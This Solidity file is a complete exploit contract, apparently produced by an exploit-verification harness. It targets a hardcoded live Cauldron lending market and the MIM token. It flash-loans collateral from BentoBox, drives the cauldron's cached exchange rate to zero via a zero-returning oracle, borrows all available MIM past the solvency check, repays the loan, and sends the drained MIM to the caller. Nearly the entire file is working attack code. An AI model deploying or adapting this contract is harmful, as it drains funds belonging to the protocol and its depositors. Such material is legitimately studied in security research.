// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool, uint256);
}

interface ICauldronLike {
    function bentoBox() external view returns (address);
    function collateral() external view returns (address);
    function exchangeRate() external view returns (uint256);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function removeCollateral(address to, uint256 share) external;
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function isSolvent(address user) external view returns (bool);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
    function deploy(address masterContract, bytes calldata data, bool useCreate2) external payable returns (address cloneAddress);
    function masterContractOf(address cloneAddress) external view returns (address masterContract);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
}

contract ZeroOracle is IOracleLike {
    function get(bytes calldata) external pure returns (bool, uint256) {
        return (false, 0);
    }
}

contract FlawVerifier is IFlashBorrowerLike {
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ADD_COLLATERAL = 10;

    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint256 internal constant MIN_COLLATERAL_LEAVE_SHARE = 1;
    uint256 internal constant TARGET_FLASH_COLLATERAL_SHARE = 1_000_000;

    address public constant TARGET_CAULDRON = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;

    ICauldronLike public constant TARGET = ICauldronLike(TARGET_CAULDRON);

    error Unauthorized();
    error SetupFailed(string reason);
    error ExecutionFailed(string reason);

    uint256 internal _profitAmount;
    bool internal _executed;

    address public vulnerableCauldron;
    address public validationClone;
    address public zeroOracle;
    address public collateralToken;
    address public profitReceiver;

    uint256 public flashAmount;
    uint256 public liveTargetLiquidity;
    uint256 public flashFee;
    uint256 public collateralDepositedShare;
    uint256 public collateralRemovedShare;
    uint256 public borrowedAmount;
    uint256 public borrowedPart;
    uint256 public borrowedShare;
    uint256 public liveTargetRateBeforeUpdate;
    uint256 public liveUpdateRate;
    uint256 public liveTargetRateAfterUpdate;
    bool public liveTargetZeroRate;
    bool public liveUpdateCallWorked;
    bool public liveUpdateReturnedSuccess;
    bool public hypothesisValidated;
    bool public usedInitZeroRatePath;
    bool public usedLiveUpdateZeroRatePath;
    bool public initOracleGetReturnedFalse;
    uint256 public initOracleRate;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return MIM;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _execute(msg.sender);
    }

    function execute() external returns (uint256) {
        return _execute(msg.sender);
    }

    function exploit() external returns (uint256) {
        return _execute(msg.sender);
    }

    function run() external returns (uint256) {
        return _execute(msg.sender);
    }

    function _execute(address receiver) internal returns (uint256) {
        if (_executed) {
            return _profitAmount;
        }
        _executed = true;
        profitReceiver = receiver;

        _deployValidationClone();
        _prepareApprovals();
        _prepareLiveTarget();

        // The prior DEX-buy assumption was disproven by logs: this collateral has no usable spot route on the
        // canonical AMMs searched in the PoC. A realistic public on-chain replacement is a BentoBox flashloan of
        // the already-custodied collateral itself, which still preserves the same exploit causality: obtain dust
        // collateral, make the live cauldron operate at exchangeRate == 0, then borrow out its prefunded MIM.
        IBentoBoxLike(TARGET.bentoBox()).flashLoan(this, address(this), collateralToken, flashAmount, bytes(""));

        _profitAmount = IERC20Like(MIM).balanceOf(address(this));
        if (_profitAmount == 0) {
            revert ExecutionFailed("NO_REALIZED_PROFIT");
        }

        _safeTransfer(MIM, receiver, _profitAmount);
        return _profitAmount;
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata) external override {
        if (msg.sender != TARGET.bentoBox() || sender != address(this) || token != collateralToken) {
            revert Unauthorized();
        }

        flashFee = fee;

        _activateZeroRateOnLiveTarget();

        // Deposit the flash-borrowed collateral directly to the cauldron inside BentoBox, then use skim=true in
        // ACTION_ADD_COLLATERAL. This avoids any external approvals while matching the real user flow of posting
        // nonzero collateral before borrowing during the zero-rate window.
        (, collateralDepositedShare) = IBentoBoxLike(TARGET.bentoBox()).deposit(
            collateralToken,
            address(this),
            TARGET_CAULDRON,
            amount,
            0
        );
        if (collateralDepositedShare <= MIN_COLLATERAL_LEAVE_SHARE) {
            revert ExecutionFailed("INSUFFICIENT_COLLATERAL_SHARE");
        }

        uint256 borrowAmount = _computeBorrowAmount();
        if (borrowAmount == 0) {
            revert ExecutionFailed("ZERO_BORROW_AMOUNT");
        }

        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_ADD_COLLATERAL;
        datas[0] = abi.encode(_toInt256(collateralDepositedShare), address(this), true);

        actions[1] = ACTION_BORROW;
        datas[1] = abi.encode(_toInt256(borrowAmount), address(this));

        (borrowedPart, borrowedShare) = TARGET.cook(actions, values, datas);
        borrowedAmount = borrowAmount;

        _withdrawAllMimShares();

        collateralRemovedShare = collateralDepositedShare - MIN_COLLATERAL_LEAVE_SHARE;
        TARGET.removeCollateral(address(this), collateralRemovedShare);

        IBentoBoxLike(TARGET.bentoBox()).withdraw(
            collateralToken,
            address(this),
            address(this),
            0,
            collateralRemovedShare
        );

        hypothesisValidated = _validateZeroRateBorrowPath();
        if (!hypothesisValidated) {
            revert ExecutionFailed("ZERO_RATE_SOLVENCY_BYPASS_NOT_REACHED");
        }

        uint256 repayAmount = amount + fee;
        if (IERC20Like(collateralToken).balanceOf(address(this)) < repayAmount) {
            revert ExecutionFailed("INSUFFICIENT_COLLATERAL_TO_REPAY_FLASHLOAN");
        }
        _safeTransfer(collateralToken, TARGET.bentoBox(), repayAmount);
    }

    function _deployValidationClone() internal {
        if (validationClone != address(0)) {
            return;
        }

        zeroOracle = address(new ZeroOracle());
        collateralToken = TARGET.collateral();
        if (collateralToken == address(0)) {
            revert SetupFailed("MISSING_TARGET_COLLATERAL");
        }

        (bool oracleSuccess, uint256 rate) = IOracleLike(zeroOracle).get(bytes(""));
        initOracleGetReturnedFalse = !oracleSuccess;
        initOracleRate = rate;
        if (oracleSuccess || rate != 0) {
            revert SetupFailed("ZERO_ORACLE_NOT_RETURNING_FALSE_ZERO");
        }

        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        address master = bento.masterContractOf(TARGET_CAULDRON);
        if (master == address(0)) {
            revert SetupFailed("MISSING_MASTER_CONTRACT");
        }

        bytes memory initData = abi.encode(
            collateralToken,
            zeroOracle,
            bytes(""),
            uint64(0),
            uint256(112_000),
            uint256(75_000),
            uint256(0)
        );

        validationClone = bento.deploy(master, initData, false);
        if (validationClone == address(0)) {
            revert SetupFailed("CLONE_DEPLOY_FAILED");
        }

        if (ICauldronLike(validationClone).exchangeRate() != 0) {
            revert SetupFailed("INIT_DID_NOT_CACHE_ZERO_RATE");
        }

        usedInitZeroRatePath = true;
    }

    function _prepareLiveTarget() internal {
        vulnerableCauldron = TARGET_CAULDRON;

        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());

        uint256 targetShares = bento.balanceOf(MIM, TARGET_CAULDRON);
        liveTargetLiquidity = bento.toAmount(MIM, targetShares, false);
        if (liveTargetLiquidity <= 1) {
            revert SetupFailed("NO_TARGET_MIM_LIQUIDITY");
        }

        uint256 bentoCollateralBalance = IERC20Like(collateralToken).balanceOf(TARGET.bentoBox());
        if (bentoCollateralBalance == 0) {
            revert SetupFailed("NO_BENTO_COLLATERAL_BALANCE");
        }

        flashAmount = _chooseCollateralFlashAmount(bento, bentoCollateralBalance);
        if (flashAmount == 0 || flashAmount >= bentoCollateralBalance) {
            revert SetupFailed("BAD_COLLATERAL_FLASH_AMOUNT");
        }
    }

    function _chooseCollateralFlashAmount(IBentoBoxLike bento, uint256 bentoCollateralBalance)
        internal
        view
        returns (uint256 amount)
    {
        amount = bento.toAmount(collateralToken, TARGET_FLASH_COLLATERAL_SHARE, true);
        if (amount == 0) {
            amount = 1;
        }

        uint256 attempts;
        while (attempts < 8 && bento.toShare(collateralToken, amount, false) <= MIN_COLLATERAL_LEAVE_SHARE) {
            amount *= 10;
            attempts++;
        }

        if (amount >= bentoCollateralBalance) {
            revert SetupFailed("INSUFFICIENT_BENTO_COLLATERAL_FOR_FLASHLOAN");
        }

        if (bento.toShare(collateralToken, amount, false) <= MIN_COLLATERAL_LEAVE_SHARE) {
            revert SetupFailed("CANNOT_SOURCE_NONZERO_COLLATERAL_SHARE");
        }
    }

    function _activateZeroRateOnLiveTarget() internal {
        liveTargetRateBeforeUpdate = TARGET.exchangeRate();
        if (liveTargetRateBeforeUpdate == 0) {
            liveTargetRateAfterUpdate = 0;
            liveTargetZeroRate = true;
            return;
        }

        try TARGET.updateExchangeRate() returns (bool updated, uint256 rate) {
            liveUpdateCallWorked = true;
            liveUpdateReturnedSuccess = updated;
            liveUpdateRate = rate;
        } catch {
            liveUpdateCallWorked = false;
        }

        liveTargetRateAfterUpdate = TARGET.exchangeRate();
        liveTargetZeroRate = liveTargetRateAfterUpdate == 0;
        usedLiveUpdateZeroRatePath = liveTargetRateBeforeUpdate != 0 && liveTargetZeroRate;

        if (!liveTargetZeroRate) {
            revert SetupFailed("LIVE_TARGET_CANNOT_BE_ZEROED");
        }
    }

    function _computeBorrowAmount() internal view returns (uint256 borrowAmount) {
        uint256 maxByLiquidity = liveTargetLiquidity > 1 ? liveTargetLiquidity - 1 : 0;
        if (maxByLiquidity == 0) {
            return 0;
        }

        (uint128 totalCap, uint128 perAddressCap) = TARGET.borrowLimit();
        (uint128 totalElastic, uint128 totalBase) = TARGET.totalBorrow();
        uint256 openingFee = TARGET.BORROW_OPENING_FEE();

        uint256 maxByTotalCap;
        if (uint256(totalCap) > uint256(totalElastic)) {
            uint256 remainingElastic = uint256(totalCap) - uint256(totalElastic);
            maxByTotalCap = _netBorrowFromGrossDebt(remainingElastic, openingFee);
        }

        uint256 maxByPerAddressCap;
        if (perAddressCap != 0) {
            if (totalElastic == 0 || totalBase == 0) {
                maxByPerAddressCap = _netBorrowFromGrossDebt(uint256(perAddressCap), openingFee);
            } else {
                uint256 grossBorrowEquivalent = (uint256(perAddressCap) * uint256(totalElastic)) / uint256(totalBase);
                maxByPerAddressCap = _netBorrowFromGrossDebt(grossBorrowEquivalent, openingFee);
            }
        }

        borrowAmount = maxByLiquidity;
        if (maxByTotalCap != 0 && maxByTotalCap < borrowAmount) {
            borrowAmount = maxByTotalCap;
        }
        if (maxByPerAddressCap != 0 && maxByPerAddressCap < borrowAmount) {
            borrowAmount = maxByPerAddressCap;
        }

        if (borrowAmount > 1) {
            borrowAmount -= 1;
        }
    }

    function _netBorrowFromGrossDebt(uint256 grossDebt, uint256 openingFee) internal pure returns (uint256) {
        if (grossDebt == 0) {
            return 0;
        }
        return (grossDebt * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + openingFee);
    }

    function _prepareApprovals() internal {
        _approveIfNeeded(collateralToken, TARGET.bentoBox(), type(uint256).max);
    }

    function _validateZeroRateBorrowPath() internal view returns (bool) {
        uint256 cachedExchangeRate = TARGET.exchangeRate();
        uint256 collateralShare = TARGET.userCollateralShare(address(this));
        uint256 debtPart = TARGET.userBorrowPart(address(this));
        bool solvent = TARGET.isSolvent(address(this));

        return usedInitZeroRatePath
            && initOracleGetReturnedFalse
            && initOracleRate == 0
            && ICauldronLike(validationClone).exchangeRate() == 0
            && liveTargetZeroRate
            && cachedExchangeRate == 0
            && collateralShare > 0
            && debtPart > 0
            && solvent;
    }

    function _withdrawAllMimShares() internal {
        uint256 mimShares = IBentoBoxLike(TARGET.bentoBox()).balanceOf(MIM, address(this));
        if (mimShares != 0) {
            IBentoBoxLike(TARGET.bentoBox()).withdraw(MIM, address(this), address(this), 0, mimShares);
        }
    }

    function _approveIfNeeded(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).allowance(address(this), spender) returns (uint256 allowed) {
            if (allowed >= amount / 2) {
                return;
            }
        } catch {}

        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) {
            revert ExecutionFailed("APPROVE_FAILED");
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) {
            revert ExecutionFailed("TRANSFER_FAILED");
        }
    }

    function _toInt256(uint256 value) internal pure returns (int256 signed) {
        if (value > uint256(type(int256).max)) {
            revert ExecutionFailed("INT256_OVERFLOW");
        }
        signed = int256(value);
    }
}
